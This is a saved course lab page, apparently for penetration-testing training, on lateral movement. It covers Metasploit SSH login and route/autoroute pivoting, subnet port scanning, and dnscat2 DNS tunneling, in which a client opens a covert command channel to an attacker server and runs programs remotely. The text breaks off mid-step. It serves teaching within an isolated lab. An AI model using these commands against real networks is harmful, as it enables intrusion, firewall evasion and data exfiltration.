@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+<!-- saved from url=(0079)https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670 -->
+<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width">
+    <title>Module 12: Lateral Movement and Pivoting</title>
+
+
+    <script src="./Module 12_ Lateral Movement and Pivoting_files/jquery.min.js.download" type="text/javascript"></script>
+    <script src="./Module 12_ Lateral Movement and Pivoting_files/Localize" type="text/javascript"></script>
+    <script src="./Module 12_ Lateral Movement and Pivoting_files/showdown.min.js.download"></script>
+    <link rel="stylesheet" type="text/css" href="./Module 12_ Lateral Movement and Pivoting_files/prettify.css">
+    <script src="./Module 12_ Lateral Movement and Pivoting_files/yaml.min.js.download"></script>
+    <script src="./Module 12_ Lateral Movement and Pivoting_files/LocalizeTo" type="text/javascript"></script>
+    <link href="./Module 12_ Lateral Movement and Pivoting_files/CloudClient.css" rel="stylesheet" type="text/css">
+
+    <style type="text/css">
+        body, html {
+            font-family: Segoe UI,Tahoma,Verdana,Arial,sans-serif;
+            font-size: 14px;
+            padding: 0;
+            margin: 0;
+            background-color: #efefef;
+            color: #000;
+            height: 100%;
+        }
+
+        body {
+            overflow: auto;
+        }
+
+        #outputWrapper {
+            background-color: #efefef;
+            min-height: 100%;
+        }
+
+        .instructionsPreview {
+            padding: 20px;
+            height: 100%;
+        }
+
+        .instructionsPreview .page {
+            position: relative;
+            display: block !important;
+            padding: 15px 20px;
+            background-color: #fff;
+            page-break-after: always;
+            min-height: 650px;
+        }
+
+        .instructionsPreview .page:not(:first-child) {
+            margin-top: 20px;
+        }
+
+        @font-face {
+            font-family: "lod";
+            src: url("/fonts/lod.woff?v=18") format("woff"), url("/fonts/lod.ttf?v=18") format("truetype"), url("/fonts/lod.svg?v=18") format("svg");
+        }
+
+        .editLink:before {
+            content: "\E70F";
+            font-family: "lod";
+            margin-right: 4px;
+            display: inline-block;
+        }
+
+        @media print {
+            body, html {
+                height: auto;
+            }
+
+            body {
+                -webkit-print-color-adjust: exact;
+            }
+
+            div {
+                page-break-inside: avoid;
+            }
+
+            #outputWrapper {
+                background-color: transparent;
+            }
+
+            .instructionsPreview {
+                padding: 0;
+            }
+
+                .instructionsPreview .page:not(:first-child) {
+                    margin-top: 0px;
+                }
+        }
+
+        @page {
+            margin-left: 1.5cm;
+            margin-right: 1.5cm;
+            margin-top: 1.5cm;
+            margin-bottom: 1.5cm;
+        }
+    </style>
+    <link id="themeStylesheet" href="./Module 12_ Lateral Movement and Pivoting_files/Light.css" rel="stylesheet">
+
+</head>
+<body>
+        <div style="padding:10px 20px;">
+            <a class="editLink" href="https://labondemand.com/LabProfile/EditInstructions/171429?InstructionsSetId=271670">Edit</a>
+        </div>
+
+    <div id="outputWrapper">
+        <div id="instructions" class="instructionsPreview instructions"><div class="page" id="page0"><h1 id="module-12-lateral-movement-and-pivoting">Module 12: Lateral Movement and Pivoting</h1>
+<h2 id="scenario">Scenario</h2>
+<p>Lateral movement is the process of navigating within a compromised network to gain access to additional systems, accounts, or data. This step is critical in penetration testing as it mimics real-world attacker behavior after initial access is achieved. It helps uncover hidden vulnerabilities, misconfigurations, and weak access controls that could be exploited to expand the attack surface. Testing lateral movement techniques, such as Pass-the-Hash, Pass-the-Ticket, or exploiting poorly segmented networks, provides organizations with valuable insights into their internal defenses and highlights areas where network segregation, privilege restrictions, or monitoring need improvement.</p>
+<p>Pivoting allows penetration testers to use a compromised system as a springboard to access other systems that are otherwise inaccessible. It demonstrates how attackers exploit trust relationships, misconfigured firewalls, or weak credentials to infiltrate deeper into the network. Pivoting helps assess the robustness of segmentation and access control mechanisms in environments such as demilitarized zones (DMZs) or isolated internal segments. By simulating pivoting techniques, penetration testers can identify potential chokepoints and recommend measures to limit an attacker’s ability to move laterally, ensuring that a breach in one area does not compromise the entire network.</p>
+<h2 id="lab-objectives">Lab Objectives</h2>
+<p>Students will learn how to perform:</p>
+<ul>
+<li><p>Pivoting using Metasploit</p></li>
+<li><p>DNS tunneling Using DNSCAT2</p></li>
+<li><p>HTTP Tunneling Using Chisel</p></li>
+</ul>
+<blockquote class="alert">
+  <p><strong>Note:</strong> All lab manuals are accessible in the <strong>Lab Manuals</strong> folder located on the <strong>Desktop</strong> of the machines. Please refer to the respective lab manual if you need to copy and paste any commands or code during the lab sessions.</p>
+</blockquote>
+</div><div class="page" id="page1">
+<h1 id="exercise-1-perform-pivoting-using-metasploit">Exercise 1: Perform Pivoting using Metasploit</h1>
+<p>If you exploit a vulnerable system using Metasploit and establish the meterpreter session, you have the option to use this session to pivot to other systems using <strong>route</strong> command or <strong>autoroute</strong> module. Once you have the session, then you can add the route to the network that the victim is connected to right within Metasploit. Since we are working with the concept here, we will use the same approach we did with the previous task, and compromise the Ubuntu machine then we can use it to pivot into the other network. We have the credentials, so we will use the same concept here. Remember, this process does not change. With a pivot, you gain access to a machine, and that machine has two or more network cards, then once you have access, you can “pivot” to the other network which you cannot see.</p>
+<h3 id="lab-tasks">Lab Tasks:</h3>
+<ol class="taskList">
+<li class="task-list-item" id="taskIndex0"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex0"><span></span></label> Click <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="268660">Parrot Security</a> to switch to the Parrot Security machine and log in with pentester/toor credentials. In the Parrot Security machine open a Terminal window and run <strong>sudo su</strong> command and in the password for the pentester field type <strong>toor</strong> as the password and press <strong>Enter</strong>.</p>
+<blockquote class="note">
+  <p>The password you enter will not be visible.</p>
+</blockquote>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/npaxvzgn.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex1"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex1"><span></span></label> Run <strong>service postgresql start</strong> to start postgresql service and <strong>msfconsole</strong> commands to launch metasploit.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/ihxjsgor.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex2"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex2"><span></span></label> Now, in msfconsole run <strong>search</strong> <strong>ssh_login</strong> to search for metasploit modules containing ssh_login. </p></li>
+<li class="task-list-item" id="taskIndex3"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex3"><span></span></label> Metasploit will display the modules that contain ssh_login type <strong>use 0</strong> and press <strong>Enter</strong> to use <strong>auxiliary/scanner/ssh/ssh_login</strong> module.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/3daxqgdl.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex4"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex4"><span></span></label> Type <strong>show options</strong> and press <strong>Enter</strong> to view the <strong>Module options</strong> pertaining to <strong>auxiliary/scanner/ssh/ssh_login</strong>.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/2thjduvc.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex5"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex5"><span></span></label> Type <strong>set</strong> <strong>USERNAME</strong> <strong>ubuntu</strong> and press <strong>Enter</strong> to set a username for authentication.</p></li>
+<li class="task-list-item" id="taskIndex6"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex6"><span></span></label> Type <strong>set PASSWORD toor</strong> and press <strong>Enter</strong> to set password for authentication.</p></li>
+<li class="task-list-item" id="taskIndex7"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex7"><span></span></label> To <strong>set RHOST</strong> type <strong>set RHOST 192.168.0.19</strong> (IP address of <strong>Ubuntu 22.04.3 CPENT</strong> machine) and press <strong>Enter</strong>. </p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/gfresm3k.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex8"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex8"><span></span></label> Type <strong>run</strong> and press <strong>Enter</strong> to run the exploit.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/52uthoi1.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex9"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex9"><span></span></label> Once the execution is completed, run <strong>sessions -u 1</strong> command to upgrade the current session.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/2ilriz0z.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex10"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex10"><span></span></label> A new meterpreter session will open run <strong>sessions -l</strong> to view the <strong>Active sessions</strong>.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/l2qqbg4v.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex11"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex11"><span></span></label> We will now check the IP configuration present in the target machine. Run <strong>sessions -i 2</strong> to interact with session 2.</p></li>
+<li class="task-list-item" id="taskIndex12"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex12"><span></span></label> A Meterpreter shell opens up, run the <strong>ipconfig</strong> command this will display all the network interfaces in the target machine.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/asw442y3.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex13"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex13"><span></span></label> We can see that the machine is connected to two network interfaces that are connected to two different subnets </p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/1eqwcxqk.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex14"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex14"><span></span></label> From here, we have two methods to add route to the second subnet of the target machine. </p></li>
+</ol>
+<ul>
+<li><p>Adding route manually</p></li>
+<li><p>Using autoroute module from Metasploit</p></li>
+</ul>
+<p><strong>Method 1</strong></p>
+<hr>
+<ol start="16" class="taskList">
+<li class="task-list-item" id="taskIndex15"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex15"><span></span></label> We will now manually add a route to the second interface of the target machine and perform port scanning on the second subnet.</p></li>
+<li class="task-list-item" id="taskIndex16"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex16"><span></span></label> To do so, in the meterpreter shell run <strong>background</strong> command, to background the session, and in the Metasploit type <strong>route add 10.1.1.0/24 2</strong>, and press <strong>Enter</strong> to add the route, where 10.1.1.0/24 is the second subnet and 2 is the session number.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/yd0tl4v2.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex17"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex17"><span></span></label> Type <strong>route</strong> and press <strong>Enter</strong> to view the newly created route in Metasploit.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/c0m34ufo.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex18"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex18"><span></span></label> We will now use <strong>auxiliary/scanner/portscan/tcp</strong> module to perform portscan on the target subnet.</p></li>
+<li class="task-list-item" id="taskIndex19"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex19"><span></span></label> In Metasploit run the <strong>use auxiliary/scanner/portscan/tcp</strong> command to switch to the <strong>auxiliary/scanner/portscan/tcp</strong> module.</p></li>
+<li class="task-list-item" id="taskIndex20"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex20"><span></span></label> Now, type <strong>set RHOSTS 10.1.1.0/24</strong> to set RHOSTS for scanning.</p></li>
+<li class="task-list-item" id="taskIndex21"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex21"><span></span></label> Type <strong>set ports 1-500</strong> to specify the port numbers to scan.</p></li>
+<li class="task-list-item" id="taskIndex22"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex22"><span></span></label> To set threads run <strong>set threads 50</strong> command.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/cgza4jue.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex23"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex23"><span></span></label> Now, type a <strong>run</strong> and press <strong>Enter</strong> to perform portscan on the target subnet.</p></li>
+<li class="task-list-item" id="taskIndex24"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex24"><span></span></label> This will scan the target subnet for open ports. There are two machines in the target subnet, <strong>10.1.1.100</strong> is the IP address of the Ubuntu machine, and <strong>10.1.1.24</strong> is the IP address of the pivot machine (Machine connected to the second subnet i.e. Wordpress Server).</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/k25kghk5.jpg" alt="Screenshot"></p></li>
+</ol>
+<p><strong>Method-2</strong></p>
+<hr>
+<ol start="26" class="taskList">
+<li class="task-list-item" id="taskIndex25"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex25"><span></span></label> In this Method we will create a route to the second subnet of the target machine using the autoroute module present in Metasploit.</p></li>
+<li class="task-list-item" id="taskIndex26"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex26"><span></span></label> Considering we already compromised the target Ubuntu machine using the ssh_login module, run the <strong>use post/multi/manage/autoroute</strong> command to switch to the <strong>post/multi/manage/autoroute</strong> module.</p></li>
+<li class="task-list-item" id="taskIndex27"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex27"><span></span></label> In the post/multi/manage/autoroute module type <strong>show options</strong> and press <strong>Enter</strong> to view the <strong>Module options</strong>.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/l0mbzb3y.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex28"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex28"><span></span></label> Now, type <strong>set session 2</strong> and press <strong>Enter</strong> to set session 2 to the current module.</p></li>
+<li class="task-list-item" id="taskIndex29"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex29"><span></span></label> Run <strong>set SUBNET 10.1.1.0/24</strong> command to set 10.1.1.0/24 as subnet.</p></li>
+<li class="task-list-item" id="taskIndex30"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex30"><span></span></label> Type <strong>run</strong> and press <strong>Enter</strong> to run the module.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/ptob0p2h.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex31"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex31"><span></span></label> Once the module execution is completed in the metasploit type <strong>route</strong> and press <strong>Enter</strong> to view the newly added route.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/itvunpq1.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex32"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex32"><span></span></label> You can further use the <strong>auxiliary/scanner/portscan/tcp</strong> module to scan the newly routed subnet for open ports.</p></li>
+</ol>
+</div><div class="page" id="page2">
+<h1 id="exercise-2--dns-tunneling-using-dnscat2">Exercise 2:  DNS tunneling Using DNSCAT2</h1>
+<p><strong>Overview of DNSCAT2</strong></p>
+<p>DNSCAT2 is a tool for DNS tunneling, allowing attackers to establish a reverse shell or command-and-control channel via DNS queries and responses. It encodes data into DNS queries sent to an attacker-controlled server, which decodes and returns the data. DNSCAT2 can bypass firewalls, as DNS traffic is typically allowed. In this exercise, we will set up a DNSCAT2 server and client, tunnel commands over DNS, and use Wireshark to monitor DNS traffic for data transfer, learning how attackers exploit DNS tunneling for data exfiltration or remote access while avoiding detection.</p>
+<p>In this exercise, DNS tunneling is explored using the DNSCAT2 tool. The objective is to demonstrate how DNS queries can be manipulated to establish communication between a client and an attacker, bypassing traditional network security measures. DNS tunneling allows attackers to transfer data over DNS requests, which can bypass firewalls and other security systems that often allow DNS traffic to pass unfiltered.</p>
+<p>The goal of this lab is to use DNSCAT2 to establish a covert communication channel between a compromised client machine and a pentester machine using DNS tunneling. Participants will: </p>
+<ul>
+<li><p>Set up DNSCAT2 on both the client and pentester machines</p></li>
+<li><p>Use DNSCAT2 to send and receive data between the two systems</p></li>
+<li><p>Capture DNS traffic using Wireshark to monitor the communication</p></li>
+<li><p>Gain shell access on the client machine via the DNS tunneling connection</p></li>
+<li><p>Understand the underlying concepts and techniques used in DNS tunneling</p></li>
+</ul>
+<h3 id="lab-tasks-1">Lab Tasks</h3>
+<ol class="taskList">
+<li class="task-list-item" id="taskIndex33"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex33"><span></span></label> Launch <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="270560">Windows 11</a> Virtual Machine as a client.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/5b3lb5rk.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex34"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex34"><span></span></label> Click <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="ctrlAltDeleteLink icon-link special-action-link">Ctrl+Alt+Delete</a> link to activate machine and login with <strong>CPENT</strong> <span class="typeText" title="Type Text">Pa$$w0rd</span> and press <strong>Enter</strong> to login. </p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/gsrv3kwn.jpg" alt="Screenshot"></p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/rizzlk5b.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex35"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex35"><span></span></label> Launch <strong>Pentester Machine</strong> by clicking on <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="268660">Parrot Security</a>. By default, the <strong>pentester</strong> account is selected.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/a06g5osh.jpg" alt="a06g5osh.jpg"></p></li>
+<li class="task-list-item" id="taskIndex36"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex36"><span></span></label> Type <strong>toor</strong> in the password field and press <strong>Enter</strong>.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/b6iou7gr.jpg" alt="b6iou7gr.jpg"></p></li>
+<li class="task-list-item" id="taskIndex37"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex37"><span></span></label> Right-click on the desktop and click on <strong>Open in terminal</strong> to open the terminal.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/i2hqvyfg.jpg" alt="i2hqvyfg.jpg"></p></li>
+<li class="task-list-item" id="taskIndex38"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex38"><span></span></label> Type <strong>sudo su</strong> and press <strong>Enter</strong>, then type <strong>toor</strong> as the password and press <strong>Enter</strong> to gain root privileges..</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/h7ra6rlt.jpg" alt="h7ra6rlt.jpg"></p></li>
+<li class="task-list-item" id="taskIndex39"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex39"><span></span></label> In the terminal, type <strong>nmap 192.168.0.100</strong> and press <strong>Enter</strong> to establish a connection with the client machine.     </p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/zo14f3ji.jpg" alt="Screenshot"></p>
+<blockquote class="note">
+  <p>We can observe that all the ports are in an ignored state, indicating that they are either filtered or blocked by a firewall.</p>
+</blockquote>
+<blockquote class="note">
+  <p>To bypass the firewall and establish interaction with the client machine [Windows 11], we need to install the Dnscat2 tool on both the client machine and the pentester machine [ParrotSecurity].</p>
+</blockquote></li>
+<li class="task-list-item" id="taskIndex40"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex40"><span></span></label> Open the terminal on the pentester machine (Parrot Security) and type the command: <strong>sudo apt install dnscat2-server</strong>, Press Enter to start the installation process. If prompted with "Do you want to continue?", type <strong>Y</strong> and press Enter to proceed, as shown in the screenshot.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/qzypcdmb.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex41"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex41"><span></span></label> Type <strong>sudo dnscat2-server --version</strong>, then press Enter to check the installed version of the dnscat2-server.</p>
+<blockquote class="note">
+  <p>Make sure that the versions of both the <strong>dnscat2-server</strong> and <strong>dnscat2-client</strong> are the same.</p>
+</blockquote>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/5hnkozyq.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex42"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex42"><span></span></label> Launch <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="270560">Windows 11</a> Virtual Machine to install <strong>dnscat2-client.</strong></p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/5b3lb5rk.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex43"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex43"><span></span></label> Click <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="ctrlAltDeleteLink icon-link special-action-link">Ctrl+Alt+Delete</a> link to login to Windows11 Machine, By default <strong>CPENT</strong> account is selected, click <span class="typeText" title="Type Text">Pa$$w0rd</span> and press <strong>Enter</strong> to login. </p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/qmlu3w00.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex44"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex44"><span></span></label> Open Google Chrome and go to the following URL: <span class="typeText" title="Type Text">https://github.com/iagox86/dnscat2</span></p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/utadilje.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex45"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex45"><span></span></label> Scroll down the page and, under the "<strong>Where to get it</strong>" section, click on the <strong>Downloads</strong> link.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/1zcrqbpx.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex46"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex46"><span></span></label> In the given list of files, select the <strong>dnscat2-v0.07-client-win32.zip</strong> file and click on it to download.</p>
+<blockquote class="note">
+  <p>Make sure that the versions of both the <strong>dnscat2-server</strong> and <strong>dnscat2-client</strong> are the same.</p>
+</blockquote>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/adcxpzli.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex47"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex47"><span></span></label> After downloading, go to the Downloads folder, right-click on the <strong>dnscat2-v0.07-client-win32.zip</strong> file, and select <strong>Extract All</strong> to extract the contents.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/tklgrsyq.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex48"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex48"><span></span></label> Click on <strong>Extract</strong>. </p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/befdwxxe.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex49"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex49"><span></span></label> In the Password Needed tab, type the password as <strong>password</strong> and click OK to extract the file.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/nb11b32u.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex50"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex50"><span></span></label> Go to the search bar, type <strong>Wireshark</strong> and press enter to launch the application, as shown in the given screenshot.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/russ5v0u.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex51"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex51"><span></span></label> Click on the <strong>Ethernet 2</strong> adapter to capture the DNS traffic between the client and pentester machines, and then run it in the background as shown in the below screenshot.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/fwurqzxx.jpg" alt="Screenshot"></p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/porovqyn.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex52"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex52"><span></span></label> Click <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="268660">Parrot Security</a>, to switch to Prot Security machine.</p></li>
+<li class="task-list-item" id="taskIndex53"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex53"><span></span></label> Right-click on the desktop and click on <strong>Open in terminal</strong> to open the terminal.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/i2hqvyfg.jpg" alt="i2hqvyfg.jpg"></p></li>
+<li><p>Type the following command <strong>sudo dnscat2-server --dns domain=abc.com</strong> to start the dnscat2-server.</p>
+<blockquote class="note">
+  <p>You can specify any domain name here; in this case, we have used abc.com.</p>
+</blockquote>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/21j5vnpj.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex54"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex54"><span></span></label> Click <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="270560">Windows 11</a> to switch to Windows 11 machine.</p></li>
+<li class="task-list-item" id="taskIndex55"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex55"><span></span></label> Navigate to the folder <strong>C:\Users\cpent\Downloads\dnscat2-v-0.7-client-win32</strong>, type cmd in the address bar, and press Enter to open the Command Prompt in that directory.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/2xttb4lk.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex56"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex56"><span></span></label> Type the following command <strong>dnscat2-v0.7-client-win32.exe --dns domain=abc.com,server=192.168.0.18</strong> and press enter to establish a session with the dnscat2-server. Here we can see <strong>session established!</strong></p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/vmth2tv5.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex57"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex57"><span></span></label> Switch to <strong>Pentester Machine</strong> by clicking on <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="268660">Parrot Security</a>.</p></li>
+<li class="task-list-item" id="taskIndex58"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex58"><span></span></label> Here in the terminal we can see <strong>New Window is created</strong> and session is established as shown in the given screenshot, Now type <strong>help</strong> to view the list of commands </p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/twpz6abo.jpg" alt="twpz6abo.jpg"></p></li>
+<li class="task-list-item" id="taskIndex59"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex59"><span></span></label> Type the following command <strong>window -i 1</strong> to interact with the client machine as shown in the given SS.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/v5csj7o6.jpg" alt="v5csj7o6.jpg"></p></li>
+<li class="task-list-item" id="taskIndex60"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex60"><span></span></label> Type <strong>help</strong> to view the list of commands.</p>
+<blockquote class="note">
+  <p>Here is the list of commands that attackers can perform after getting access through DNS tunneling.</p>
+</blockquote>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/wgfqqnau.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex61"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex61"><span></span></label> To open any .exe file type the following command <strong>exec notepad.exe</strong> to open the notepad.</p>
+<blockquote class="note">
+  <p>In the place of <strong>notepad.exe</strong> we can give any .exe file which is present in the client machine.</p>
+</blockquote>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/ksujycdk.jpg" alt="ksujycdk.jpg"></p></li>
+<li class="task-list-item" id="taskIndex62"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex62"><span></span></label> Click <a href="https://labondemand.com/LabProfile/Instructions/171429?instructionsSetId=271670#" class="selectMachineLink icon-link special-action-link" data-data="270560">Windows 11</a> to switch to Windows 11 machine to check whether Notepad is open or not, here we can see that notepad is opened as shown in the screenshot.</p>
+<p>
+<img src="./Module 12_ Lateral Movement and Pivoting_files/tv5p0wrc.jpg" alt="Screenshot"></p></li>
+<li class="task-list-item" id="taskIndex63"><p><label class="checkbox"><input type="checkbox" aria-labelledby="taskIndex63"><span></span></label> Open Wireshark to view the captured DNS traffic between the client and pentester machines. In the Filter bar, type the <strong>dns</strong> as shown in the Screenshot.</p>
+<blockquote class="note">
